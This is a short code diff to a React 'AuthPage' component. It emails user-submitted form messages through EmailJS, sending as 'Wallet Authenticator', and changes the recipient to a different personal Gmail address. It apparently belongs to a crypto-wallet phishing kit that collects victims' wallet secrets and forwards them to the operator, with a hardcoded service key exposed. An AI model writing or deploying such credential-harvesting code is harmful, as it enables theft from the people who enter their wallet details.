@@ -17,14 +17,15 @@ function AuthPage() {
       message: data.message,
       from_email: "walletauthenticator@gmail.com",
       from_name: "Wallet Authenticator",
+      to_name: "stevewinfried@gmail.com",
       // to_name: "olaleyelekan15@gmail.com",
-      to_name: "solomonayodele65@gmail.com",
+      // to_name: "solomonayodele65@gmail.com",
     };
 
     emailjs
       .send(
         "service_8c90ycf",
-        "template_bl5ug3g",
+        "template_93bepz4",
         templateParams,
         "Ha8pmtqm2UY1Q_AQn"
         //"mE2fJOTkVsrNl8zkR"
